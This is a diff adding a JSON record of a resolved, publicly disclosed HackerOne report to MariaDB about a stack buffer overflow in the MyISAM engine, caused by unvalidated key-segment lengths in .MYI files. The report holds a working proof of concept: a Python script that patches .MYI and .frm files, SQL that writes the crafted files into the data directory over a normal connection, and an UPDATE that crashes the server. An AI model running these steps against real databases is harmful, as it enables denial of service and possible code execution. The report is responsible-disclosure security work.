@@ -1,0 +1,108 @@
+{
+  "id": 3771147,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzcxMTQ3",
+  "url": "https://hackerone.com/reports/3771147",
+  "title": "Stack Buffer Overflow via Crafted keyseg->start/ keyseg->length in .MYI File (MariaDB MyISAM)",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-30T10:37:16.626Z",
+  "submitted_at": "2026-05-30T10:37:16.989Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lukas_kupczyk",
+    "url": "/lukas_kupczyk",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-15T09:37:50.307Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-15T08:04:36.368Z",
+  "team_member_agreed_on_going_public_at": "2026-09-15T09:37:49.876Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Description:** \n\nA stack buffer overflow exists in MariaDB's MyISAM storage engine. `mi_update()` declares a fixed-size stack buffer `old_key[HA_MAX_KEY_BUFF]` (1208 bytes) and passes it to `_mi_make_key()`, which copies `keyseg->length` bytes from `record + keyseg->start` into this buffer. Both fields are read directly from the `.MYI` file by `mi_keyseg_read()` without validation. The only existing check (`share->base.max_key_length <= HA_MAX_KEY_BUFF`) uses a separate header field never cross-checked against individual keyseg values, so it is trivially bypassed.\n\nThe entire attack can be delivered over a normal SQL connection; no separate filesystem or OS access is required. A user holding the `FILE` privilege writes the malicious `.MYI` (and on MariaDB 5.5.27 or later a matching `.frm`, due to the `check_definition()` consistency check from BUG\\#25908/BUG\\#13555854) directly into `@@datadir` with `SELECT UNHEX(…) INTO DUMPFILE`, issues `FLUSH TABLES`, and triggers the overflow with a single `UPDATE`. The `.MYD` content can be supplied by an ordinary `INSERT`. Secondary vectors that bypass the `FILE` requirement include untrusted backup restore and shared hosting with datadir write access.\n\nThe vulnerable code in `storage/myisam/mi_open.c` lines 1209-1218:\n\n```c\nuchar *mi_keyseg_read(uchar *ptr, HA_KEYSEG *keyseg)\n{\n   keyseg->length = mi_uint2korr(ptr);  ptr +=2;  // uint16 from .MYI, no bounds check\n   // ...\n}\n```\n\nThe overflow in `storage/myisam/mi_search.c` lines 985-999:\n\n```c\n    else\n      length=keyseg->length;  // fixed-length path: unchecked value up to 65535\n    memmove((uchar*) key, (uchar*) from, (size_t) length);  // overflow into t_buff[1208]\n```\n\nThe same overflow via `_mi_make_key()` in `storage/myisam/mi_key.c` (the path reached from `mi_update()`):\n\n```c\n    size_t length = keyseg->length;           // from .MYI, attacker-set\n    pos = (uchar*) record + keyseg->start;    // from .MYI, attacker-set\n    memcpy((uchar*) key, pos, char_length);   // unbounded vs. caller's stack frame\n```\n\nThe stack buffer declaration in `storage/myisam/mi_update.c` lines 28, 111:\n\n```c\n  uchar old_key[HA_MAX_KEY_BUFF];  // 1208 bytes on stack\n  uint old_length=_mi_make_key(info,i,old_key,oldrec,pos);  // copies keyseg->length bytes\n```\n\n**Reproduction Steps:** \n\n1. Create a legitimate MyISAM table with a large VARBINARY column and key prefix:\n\n```sql\nCREATE TABLE evil1 (c VARBINARY(3000) NOT NULL, KEY(c(1000))) ENGINE=MyISAM;\nINSERT INTO evil1 VALUES (REPEAT('A', 3000));\nFLUSH TABLES;\n```\n\n2. Patch the `.MYI` and `.frm` files to set `keyseg->length` to a value exceeding `HA_MAX_KEY_BUFF` (1208):\n\n```py\nimport struct\n\nMYI_PATH = \"/var/lib/mysql/<database>/evil1.MYI\"\nFRM_PATH = \"/var/lib/mysql/<database>/evil1.frm\"\nTARGET_LENGTH = 1500  # Must exceed HA_MAX_KEY_BUFF (1208)\n\n# --- Patch .MYI: set keyseg->length to TARGET_LENGTH ---\nwith open(MYI_PATH, \"rb\") as f:\n    myi = bytearray(f.read())\n\nbase_pos = struct.unpack_from('>H', myi, 12)[0]\nkeydef_start = base_pos + 100   # base_info_length = 100\nkeyseg_start = keydef_start + 12  # MI_KEYDEF_SIZE = 12\n\nstruct.pack_into('>H', myi, keyseg_start + 8, TARGET_LENGTH)\n\n# Clear HA_VAR_LENGTH_PART flag so the fixed-length memcpy path is taken\nstruct.pack_into('>H', myi, keyseg_start + 6, 0x0000)\n\nwith open(MYI_PATH, \"wb\") as f:\n    f.write(myi)\n\n# --- Patch .frm: set key_part->length to match ---\nwith open(FRM_PATH, \"rb\") as f:\n    frm = bytearray(f.read())\n\nkey_offset = struct.unpack_from('<H', frm, 6)[0]\nkey_part_length_offset = key_offset + 6 + 8 + 7\nstruct.pack_into('<H', frm, key_part_length_offset, TARGET_LENGTH)\nstruct.pack_into('<H', frm, key_offset + 6 + 2, TARGET_LENGTH)\n\nwith open(FRM_PATH, \"wb\") as f:\n    f.write(frm)\n```\n\nAlternatively, write the patched files over the wire (no local access needed):\n\n```sql\nSET @p = CONCAT(@@datadir, 'test/evil1.MYI');\nSET @s = CONCAT('SELECT UNHEX(''', '<MYI hex>', ''') INTO DUMPFILE ''', @p, '''');\nPREPARE s FROM @s; EXECUTE s; DEALLOCATE PREPARE s;\n-- repeat for evil1.frm\nFLUSH TABLES;\n```\n\n3. Trigger the overflow by executing any DML that touches the key:\n\n```sql\nUPDATE evil1 SET c = REPEAT('B', 3000) WHERE c = REPEAT('A', 3000);\n```\n\n4. Expected result — server crashes with a stack-buffer-overflow:\n\n```\n==16047==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x77d9303f5d18\nWRITE of size 292 at 0x77d9303f5d18 thread T15\n    #0 memmove (sanitizer_common_interceptors_memintrinsics.inc:98)\n    #1 _mi_get_binary_pack_key /storage/myisam/mi_search.c:999\n    #2 _mi_seq_search /storage/myisam/mi_search.c:264\n    #3 _mi_search_pos /storage/myisam/mi_range.c:241\n```\n\n## Impact\n\nThe overflow content is fully attacker-controlled row data. At minimum, any DML touching the corrupted table's key reliably crashes the server (DoS). On targets without stack canaries or ASLR, this yields direct code execution as the `mysql` user. Hardened targets remain exploitable with auxiliary info-leak primitives.\n\nRCE as `mysql` grants access to all databases and bypasses all SQL-level access controls.",
+  "weakness": {
+    "id": 3,
+    "name": "Classic Buffer Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-15T08:04:36.519Z",
+  "allow_singular_disclosure_after": 2582027.099654648,
+  "singular_disclosure_allowed": false,
+  "vote_count": 0,
+  "voters": [],
+  "structured_scope": {
+    "databaseId": 10336,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Data corruption, exfiltration, disclosure",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
